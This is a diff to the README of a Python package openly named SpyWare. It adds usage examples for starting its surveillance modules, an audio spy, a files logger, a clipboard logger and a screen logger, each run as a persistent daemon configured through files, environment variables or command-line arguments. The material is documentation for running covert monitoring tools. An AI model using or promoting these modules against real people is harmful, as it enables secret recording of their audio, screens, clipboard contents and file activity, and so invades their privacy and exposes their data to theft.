@@ -45,14 +45,40 @@ spyware() # Run all modules
 
 ```python
 from SpyWare import AudioLogger
-AudioLogger.audioSpy()
+AudioLogger.audioSpy() # Run a module
+```
+
+There are three way to change the config filename:
+ 1. With argument `filename` of config function
+ 2. With `environ` variables
+ 3. With command line arguments
+
+```python
+from SpyWare.FilesLogger import Daemon, filesConfig
+filesConfig("files.conf")
+Daemon().run_for_ever()
 ```
 
 ```python
+from SpyWare.CopyLogger import Daemon, copyConfig
+
 from os import environ
-environ["clipboardSpy.conf"] = "clipboard.conf" # Set environ variable before import SpyWare module(s)
- 
-from SpyWare.CopyLogger import Daemon
+environ["clipboardSpy.conf"] = "clipboard.conf"
+
+copyConfig()
+
+daemon = Daemon()
+daemon.run_for_ever()
+```
+
+```python
+from SpyWare.ScreenLogger import Daemon, screenConfig
+
+from sys import argv
+argv[1] = "screen.conf"
+
+screenConfig()
+
 daemon = Daemon()
 daemon.run_for_ever()
 ```
